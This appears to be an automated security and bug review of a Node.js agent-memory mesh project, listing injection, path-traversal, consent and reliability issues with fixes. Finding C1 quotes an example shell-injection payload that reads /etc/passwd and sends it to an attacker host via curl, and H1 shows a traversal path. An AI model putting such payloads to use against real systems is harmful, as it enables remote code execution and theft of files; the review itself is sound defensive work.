# Code Review — mesh-memory
Date: 2026-03-21
Reviewer: Liz (automated)

---

## Summary

**20 issues found: 1 critical, 3 high, 8 medium, 8 low**

---

## Findings

---

### C1 — Critical · Shell Injection via Thread Proposal Fields
**File:** `thread-notify.mjs` — `sendSystemEvent()` (lines ~38–50)

**Description:**
`sendSystemEvent` builds a shell command by string-interpolating user-supplied proposal content. Only double quotes are escaped — no protection against `$()`, backticks, newlines, or other shell metacharacters. `text` is composed from `proposal.purpose`, `proposal.scope`, `proposal.closingCondition`, and `acceptedAgents` — all attacker-controlled if a malicious peer agent submits a crafted proposal. Any peer with a valid bearer token can trigger RCE on the host machine.

```js
// VULNERABLE:
const escaped = text.replace(/"/g, '\\"');
exec(`openclaw system event --text "${escaped}" --mode now`, ...)

// e.g. proposal.purpose = "$(curl http://attacker.com/$(cat /etc/passwd))"
// → shell expands the subshell expression
```

**Fix:** Replace `exec` (shell: true) with `execFile` (no shell):
```js
import { execFile } from "node:child_process";
const execFileAsync = promisify(execFile);
await execFileAsync("openclaw", ["system", "event", "--text", text, "--mode", "now"]);
```
This passes the text as a literal argument, no shell expansion possible.

---

### H1 — High · Path Traversal via Unvalidated threadId
**Files:**
- `thread-context.mjs` — `validateToken()`, `getManifest()`, `writeEntry()`, route handler (~lines 74–170)
- `thread-close.mjs` — `closeThread()`, route handler (~lines 50–130)

**Description:**
`threadId` is taken directly from the URL parameter (`req.params.threadId`) and passed to `resolve(THREADS_DIR, threadId, ...)` without sanitization. `path.resolve()` does **not** prevent traversal — `resolve('/base', '../../etc/passwd', 'tokens.json')` yields `/etc/passwd/tokens.json`. An attacker with a valid bearer token can supply a crafted `threadId` like `../../some/path` to attempt operations outside `THREADS_DIR`. Additionally, a `threadId` of `archive` or `pending` skips normal manifest handling.

```js
// VULNERABLE:
const tokensPath = resolve(THREADS_DIR, threadId, "tokens.json");
const manifest   = await getManifest(threadId);  // same issue
```

**Fix:** Validate threadId is a UUID before any file operations:
```js
const UUID_RE = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
if (!UUID_RE.test(threadId)) {
  return res.status(400).json({ error: "Invalid threadId" });
}
```
Apply this check at the top of every route handler that receives `:threadId`.

---

### H2 — High · All Thread Proposals Auto-Accepted (No Participant Validation)
**File:** `thread-consent.mjs` — `createConsentRouter()` (~line 55)

**Description:**
The consent handler unconditionally accepts every inbound proposal with `const accepted = true`. There is no validation that:
- The `proposingAgent` is a known/trusted peer
- The `participants` list contains only known agents
- The `purpose` or `scope` is within expected bounds

Combined with the fact that all peers share a single bearer token (`config.receiverToken`), any agent that knows the token can impersonate any `proposingAgent`, and the receiving agent will accept every proposal and open a collaboration thread.

```js
// VULNERABLE — placeholder that was never replaced:
const accepted = true;
```

**Fix (minimum):** Cross-reference `proposal.proposingAgent` against `config.peers`:
```js
const knownPeer = config.peers.find(p => p.name === proposal.proposingAgent);
const accepted = !!knownPeer;
if (!accepted) {
  console.warn(`[thread-consent] Rejected proposal from unknown agent: ${proposal.proposingAgent}`);
}
```

---

### H3 — High · Eager File Offset Causes Silent Data Loss on Write Errors
**File:** `memory-watcher.mjs` — `readDelta()` and `handleFileChange()` (~lines 37–50, 107–165)

**Description:**
`readDelta()` advances `fileOffsets` to the new file size **before** the lines are processed by `handleFileChange`. If any subsequent operation in the processing loop throws (e.g., `writeLocal()` fails due to a disk error, or `relayEvent()` throws), the outer `try/catch` in `handleFileChange` catches and logs the error — but the offset is already at the new position. On the next file change, those lines are permanently skipped. Data is silently lost.

```js
// In readDelta — offset advanced before caller processes lines:
fileOffsets.set(filePath, fileStat.size);  // ← eagerly committed
return delta.split("\n").filter(...);      // ← caller processes these lines

// In handleFileChange — if writeLocal throws for line 3 of 5,
// lines 3–5 are permanently skipped because offset already advanced.
```

**Fix:** Only advance the offset per successfully-processed line:
```js
// Keep offset at start; advance per line after successful processing
let processedOffset = offset;
for (const line of lines) {
  // ... process line ...
  processedOffset += Buffer.byteLength(line + "\n", "utf-8");
  fileOffsets.set(filePath, processedOffset);
}
```
Or: advance the offset only after the full loop completes without throwing.

---

### M1 — Medium · Any Authenticated Peer Can Close Any Thread
**File:** `thread-close.mjs` — close route handler (~lines 107–120)

**Description:**
The `/mesh/thread/:threadId/close` endpoint verifies the bearer token (via middleware in `thread-manager.mjs`) but does **not** verify that the requesting agent is a participant in the thread being closed. Any peer with the token can close any active thread by guessing or knowing its UUID.

**Fix:** Extract the requesting agent's identity from the request (via a per-peer token or a signed body field) and verify against `manifest.participants` before closing.

---

### M2 — Medium · `flushPeer` Not Awaited — Relay Errors Silently Dropped
**File:** `memory-relay.mjs` — `relayEvent()` (~line 83)

**Description:**
`flushPeer` is an `async` function but is called without `await` in `relayEvent`. Its returned promise is discarded. While individual `sendToPeer` errors are logged inside `flushPeer`, the caller has no way to know if relay failed, and any unhandled rejection inside `flushPeer` outside the try/catch would be lost.

```js
// VULNERABLE:
flushPeer(peer.name, peer, relayRateLimit);  // fire and forget
```

**Fix:** At minimum, attach a catch to surface unexpected errors:
```js
flushPeer(peer.name, peer, relayRateLimit).catch(err =>
  console.error(`[relay] Unexpected flush error for ${peer.name}:`, err.message)
);
```

---

### M3 — Medium · Relay Queue Grows Unboundedly When Peers Are Unavailable
**File:** `memory-relay.mjs` — `pendingQueues` map (~lines 7–10, 79–90)

**Description:**
Events are added to `pendingQueues` for each peer, but there is no maximum queue size. If a peer is offline for an extended period, the queue grows without bound, potentially causing memory exhaustion in long-running deployments. There is also no backpressure mechanism to slow down new events.

**Fix:** Add a configurable max queue depth:
```js
const MAX_QUEUE_DEPTH = config.relayMaxQueueDepth || 500;
if (pendingQueues.get(peer.name).length >= MAX_QUEUE_DEPTH) {
  console.warn(`[relay] Queue full for ${peer.name} — dropping oldest event`);
  pendingQueues.get(peer.name).shift();  // drop oldest
}
```

---

### M4 — Medium · Thread Manager Port 18802 Hardcoded
**File:** `thread-manager.mjs` — line ~8

**Description:**
`const THREAD_PORT = 18802;` is hardcoded and not read from config. Running multiple agents on the same machine or customizing port layouts is not possible without editing source.

**Fix:**
```js
const THREAD_PORT = config.threadPort || 18802;
```
Add `"threadPort": 18802` to `mesh-memory.config.json` as the documented default.

---

### M5 — Medium · Hardcoded Port Substitution (:18801 → :18802) Is Fragile
**Files:** `thread-propose.mjs` (~line 42), `thread-close.mjs` (~line 74), `thread-notify.mjs` (~line 72)

**Description:**
All three files derive the thread endpoint URL by doing:
```js
const peerThreadUrl = peer.url.replace(/:18801\b/, ":18802");
```
This silently fails for any peer not running on port 18801 (custom install, port conflicts). If the regex doesn't match, the original URL is used unchanged — thread requests go to the receiver port, causing silent failures. There's no warning when the substitution doesn't match.

**Fix:** Store a separate `threadUrl` field per peer in config:
```json
{ "name": "ray", "url": "http://192.168.1.2:18801", "threadUrl": "http://192.168.1.2:18802", "token": "..." }
```
Fall back to the substitution only if `threadUrl` is not present, and log a warning when falling back.

---

### M6 — Medium · No Timestamp Validation in Memory Receiver
**File:** `memory-receiver.mjs` — `validateEvent()` (~lines 21–33) and `getFilePath()` (~line 52)

**Description:**
`validateEvent` checks that `timestamp` is a non-empty string but does not validate it's a parseable ISO date. `getFilePath(new Date(event.timestamp))` will produce `NaN-NaN-NaN.md` (and write to it) if the timestamp is malformed. An attacker with the bearer token could spam a crafted timestamp to create junk files.

```js
// No ISO validation — "garbage" is accepted:
if (!body.timestamp || typeof body.timestamp !== "string") return "Missing...";
```

**Fix:**
```js
const ts = new Date(body.timestamp);
if (isNaN(ts.getTime())) return "Invalid timestamp — must be ISO 8601";
```

---

### M7 — Medium · `app.listen` Has No Error Handler (Port Conflict Unhandled)
**Files:**
- `memory-receiver.mjs` — `main()` (~line 93)
- `thread-manager.mjs` — `start()` (~line 42)

**Description:**
Neither server attaches an `error` event listener to the HTTP server. If the configured port is already in use (`EADDRINUSE`), Node throws an unhandled exception and the process crashes without a useful diagnostic message.

**Fix:**
```js
const srv = app.listen(port);
srv.on("error", (err) => {
  if (err.code === "EADDRINUSE") {
    console.error(`[receiver] Port ${port} is already in use. Is another receiver running?`);
  } else {
    console.error("[receiver] Server error:", err.message);
  }
  process.exit(1);
});
```

---

### M8 — Medium · Privacy Sensitivity Hints Leaked to Peer Agents
**File:** `memory-watcher.mjs` — relay path (~lines 130–140)

**Description:**
When `relayEnabled === true`, the event forwarded to peers includes `event.privacyHints` — an array of topic-category labels derived from content pattern matching (e.g., `"financial/compensation topic"`, `"health topic"`, `"credential or secret"`). While not the actual message content, these labels reveal **what topics are being discussed** in sessions that the peer would otherwise not have access to. This is a minor but real privacy info-leak in the same spirit as the relay opt-out bug.

**Fix:** Strip `privacyHints` from the event before relaying:
```js
const { privacyHints: _ph, suggestedTag: _st, ...relayEvent } = event;
if (config.relayEnabled === true) {
  await relayEvent(relayEvent, config);
}
```

---

### L1 — Low · `/health` Endpoint Exposes `agentId` Without Authentication
**File:** `memory-receiver.mjs` (~line 94)

**Description:**
The `/health` endpoint is mounted **after** the auth middleware but bypasses it because the auth middleware uses `app.use("/", ...)` — which matches all routes. Wait — actually the auth IS applied to all routes including `/health`. On second inspection, `app.use("/", authMiddleware)` runs for all paths. However, in practice many deployments expose `/health` publicly for uptime monitoring. Verify this is intentional. If the service should be publicly probeable, the `agentId` in the response is information disclosure.

**Fix:** If public health checks are needed, omit the `agent` field:
```js
app.get("/health", (_req, res) => res.json({ status: "ok" }));
```

---

### L2 — Low · `watchFile` on Contacts Registry Is Never Unwatched (Resource Leak)
**File:** `identity-resolver.mjs` (~line 28)

**Description:**
```js
watchFile(CONTACTS_PATH, { interval: 5000 }, () => { loadRegistry(); });
```
`watchFile` attaches a persistent kernel-level inotify/kqueue/poll listener. It is never released. This is harmless in normal daemon operation but causes issues in test environments (prevents process exit, causes warnings) and leaks resources if the module is ever used in a context where it's loaded/unloaded repeatedly.

**Fix:** Export an `unwatchContacts()` function and call it during graceful shutdown, or use `chokidar.watch` which is already a dependency and supports `.close()`.

---

### L3 — Low · Synchronous `writeFileSync` on Every Unknown Identity
**File:** `identity-resolver.mjs` — `flagUnknown()` and `saveRegistry()` (~lines 140–150)

**Description:**
Every unknown sender ID encountered at runtime triggers a synchronous `writeFileSync` call to save the contacts registry. In a high-traffic scenario (many new/unknown senders), this blocks the event loop on every message processed, causing measurable latency spikes.

**Fix:** Debounce registry saves:
```js
let savePending = false;
function scheduleSave(reg) {
  if (savePending) return;
  savePending = true;
  setImmediate(() => { saveRegistry(reg); savePending = false; });
}
```

---

### L4 — Low · TOCTOU Race Condition in `writeLessonEntry` Header Check
**File:** `lesson-tagger.mjs` — `writeLessonEntry()` (~lines 103–115)

**Description:**
```js
try {
  await stat(filePath);
} catch {
  header = `# Lessons ...`;
}
await appendFile(filePath, header + entry, "utf-8");
```
Between `stat` returning "not found" and `appendFile` writing, another concurrent write could create the file. This results in the header appearing multiple times in the same day's lessons file.

**Fix:** Use atomic create-or-append: open with `flags: 'a'` and check `fd.stat().size === 0` to detect new file in a single operation, or use a simple per-file mutex.

---

### L5 — Low · `setInterval` Ref Not Stored in `memory-bridge.mjs`
**File:** `memory-bridge.mjs` — `main()` (~line 91)

**Description:**
```js
setInterval(async () => { ... }, interval);
```
No reference is stored, so the interval cannot be cancelled programmatically. The SIGINT handler calls `process.exit(0)` which cleans up, but this prevents clean integration testing and graceful shutdown of a managed multi-process setup.

**Fix:** Store the interval ref and clear on SIGINT:
```js
const intervalId = setInterval(...);
process.on("SIGINT", () => { clearInterval(intervalId); process.exit(0); });
```

---

### L6 — Low · Comment Says "Write Redacted Notice" But Code Does Not
**File:** `memory-watcher.mjs` — suppress branch (~lines 118–124)

**Description:**
The code comment says:
```js
// Write a redacted notice locally so peers know a gap exists
event.content = "[redacted — private message]";
event.suppressed = true;
// Do NOT relay suppressed messages
continue;  // ← skips writeLocal!
```
The `continue` skips `writeLocal`, so the redacted notice is **never written**. The gap silently exists with no local record. This is both a correctness bug (the stated intent doesn't match the behavior) and a mild privacy concern — the local agent loses the gap marker.

**Fix:** Either remove the comment (the current behavior is actually more private), or explicitly write the redacted notice before `continue`:
```js
await writeLocal({ ...event, content: "[redacted — private message]", suppressed: true });
continue;
```

---

### L7 — Low · `sessionPrivateMode` Map Grows Unboundedly
**File:** `privacy.mjs` — module-level `sessionPrivateMode` Map

**Description:**
The `sessionPrivateMode` Map accumulates one entry per unique `sessionKey` seen over the lifetime of the process. `resetSession(sessionKey)` exists but must be called explicitly by the consumer. `memory-watcher.mjs` never calls it when a session ends. In a long-running watcher watching many session files, this leaks memory proportional to the number of distinct sessions observed.

**Fix:** In `memory-watcher.mjs`, hook into the chokidar `unlink` event to call `resetSession` when a session JSONL file is removed:
```js
watcher.on("unlink", (filePath) => {
  const sessionKey = filePath.split("/").pop().replace(".jsonl", "");
  resetSession(sessionKey);
});
```

---

### L8 — Low · Async Event Handlers Without `.catch()` on File Watcher
**File:** `memory-watcher.mjs` — `main()` (~lines 175–178)

**Description:**
```js
watcher.on("change", (filePath) => handleFileChange(filePath, config));
watcher.on("add",    (filePath) => handleFileChange(filePath, config));
```
`handleFileChange` is `async` and returns a Promise. The event handler doesn't attach `.catch()`. The outer `try/catch` inside `handleFileChange` should catch all expected errors, but any unexpected synchronous throw from the async function before it yields would produce an unhandled promise rejection. In Node 18+, unhandled rejections crash the process.

**Fix:**
```js
watcher.on("change", (filePath) =>
  handleFileChange(filePath, config).catch(err =>
    console.error("[watcher] Unhandled error:", err.message)
  )
);
```

---

## Clean Files

The following files were reviewed and contain **no significant bugs**:

- **`mesh-memory.mjs`** — Simple command dispatcher; no logic bugs or security surface.
- **`config.mjs`** — Correct merge logic; local override pattern is sound. (Minor: no schema validation of loaded values, but this is architectural, not a bug.)
- **`privacy.mjs`** — Core privacy logic is correct; opt-in relay check is correctly implemented (`relayEnabled === true`). (Minor L7 noted above.)

---

## Notes

- The relay opt-in fix (`relayEnabled === true`) is correctly applied in `memory-watcher.mjs`. No equivalent opt-out bugs found in other components.
- The bearer token auth in `memory-receiver.mjs` and `thread-manager.mjs` is correctly structured (token mismatch → 401).
- `memory-bridge.mjs` SQL queries are safe: table names come from a hardcoded allowlist and column names are validated against a fixed set before interpolation.
- `dream-cycle.mjs` does not relay private content because private messages are excluded from local mesh files by the watcher. The dream cycle only reads what was written to disk.
